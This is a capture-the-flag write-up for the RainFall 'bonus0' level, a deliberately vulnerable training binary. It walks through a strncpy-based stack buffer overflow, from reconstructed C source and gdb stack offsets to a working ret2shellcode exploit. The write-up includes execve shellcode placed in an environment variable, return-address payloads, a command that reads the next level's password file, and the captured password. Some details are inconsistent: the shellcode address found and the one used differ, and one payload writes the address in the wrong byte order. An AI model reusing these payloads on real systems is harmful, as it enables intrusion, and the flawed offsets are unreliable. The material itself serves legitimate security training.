# Bonus 0

## Answer
Our C source code generates almost the same assembly code as the original binary. Compile it as follows:
> There is a slight difference as mentioned in the comments of the source code. I assume this is due to us using the wrong type for the buffers in the `pp` function. Nonetheless, it doesn't change the program's behavior
```
gcc -fno-stack-protector source.c
```

Let's take a look at the source code:
```c
#include <stdio.h>
#include <string.h>

unsigned short *a = 32;

void p(char *str, char *str2)
{
    char buf[4096];

    puts(str2);
    read(0, buf, 4096);
    *strchr(buf, '\n') = 0;
    strncpy(str, buf, 20);
}

// sub is incorrect by 4 bytes and ebx is not used
void pp(char *str)
{
    char buf[20];
    char buf2[20];

    p(buf2, " - ");
    p(buf, " - ");

    strcpy(str, buf2);

    str[strlen(str)] = *a;

    strcat(str, buf);
}

int main()
{
    char buf[42];

    pp(buf);
    puts(buf);

    return 0;
}
```

Let's focus on the `main` function. It reads input using the `read` function, the null terminator is then added with `strchr` and the string is copied to the `buf` buffer using `strncpy` with a size of 20. However, the `strncpy` function doesn't add a null terminator if the string is longer than the size provided. Therefore, the `str` buffer will not be null terminated.

This will result in `strcpy` copying the `buf2` buffer to the `str` buffer, but it will not stop at the null terminator, since there is none. It will continue to copy the `buf` buffer to the `str` buffer, which can result in a buffer overflow. Then `strcat` will append the `buf` buffer to the `str` buffer. Let's first see how many bytes we need to overflow the buffer by analyzing the stack layout of our program:
```bash
(gdb) b *main+38 # Breaking before leave
Breakpoint 1 at 0x80485ca

(gdb) r # Run the program
Starting program: /home/user/bonus0/bonus0
 -

 -



Breakpoint 1, 0x080485ca in main ()

(gdb) info registers # Check esp and ebp addresses
[...]
esp            0xbffff6f0       0xbffff6f0
ebp            0xbffff738       0xbffff738
[...]
```

By calculating the difference between `esp` and `ebp` we can see that the stack is allocated 72 bytes:
```
0xbffff738 - 0xbffff6f0 = 48 (72 in decimal)
```

Furthermore, we can see that our buffer is located at `0x16(%esp),%eax`. Since there is 72 bytes for the stack, our buffer will therefore requiere 50 bytes (72 - 22) before reaching `ebp`.

Since our goal is to overflow the stack until we reach the return address of the main function, we need to add another 4 bytes to go from `ebp` to `ebp + 4` (the return address). So a total of 54 bytes (50 + 4).

Anything written beyond those 54 bytes will be treated as an address (only the 4 next bytes) and jumped to by the `ret` instruction of the `main` function.

Since we now know that 54 bytes are required, let's see how many we can write:
```bash
bonus0@RainFall:~$ ./bonus0
 -
AAAAAAAAAAAAAAAAAAAA
 -
BBBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���
Segmentation fault (core dumped)
```

We're obviously limited to 20 bytes per buffer, but as we can see, the 20 bytes of B's are written after the 20 bytes of A's. There is also a space added between the two buffer and finally another 20 bytes of A's. So it's possible to write 61 bytes in total which is more than enough to overwrite the return address of the `main` function.

Since the bytes of `buf` are written after the bytes of `buf2`, we have to be slightly tactical to figure out where we need to write our address:
```
20 bytes of buf2 + 19 bytes of buf + 1 byte of space + 19 bytes of buf

54 - 59 = -5 bytes
```

So we need to write our address 5 bytes before the end of the `buf` buffer. Such as:
```
buf2 = "AAAAAAAAAAAAAAAAAAAA"
buf = "BBBBBBBBBBBBBB" + Address (4 bytes) + "B"
20 + 19 + 1 + 14 = 54 bytes
```

Since a ret2libc would requiere 12 bytes (4 bytes for the address of `system`, 4 bytes for the address of `exit` and 4 bytes for the address of "/bin/sh"), we're just going to use a ret2shellcode.

We can either feed our shellcode to the program in the `buf` of the `p` function who has a size of 4096 bytes thanks to the `read` function, or we can put the shellcode in an environment variable `EXPLOIT`. For convenience, we'll use the environment variable:
```bash
bonus0@RainFall:~$ export EXPLOIT=`python -c "print '\x90' * 200 + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
```

We'll write and run a C program to find the address of the environment variable:
```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    printf("%p\n", getenv("EXPLOIT"));
    return 0;
}
```

```bash
bonus0@RainFall:/tmp$ ./a.out
0xbffff848
```

Alright, let's craft our payloads:
```
arg1 = padding of 20 bytes
arg2 = padding of 14 bytes + address of the shellcode in the env + padding of 1 byte

arg1 = A * 20
arg2 = B * 14 + "\xbf\xff\xf8\x48" + B * 1
```

Let's run it:
```bash
bonus0@RainFall:~$ (python -c 'print "A" * 20'; python -c 'print "B" * 14 + "\x10\xf9\xff\xbf" + "B"'; echo 'cat /home/user/bonus1/.pass') | ./bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBH���A BBBBBBBBBBBBBBH���A
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

We are now bonus1! Let's move on to the next level.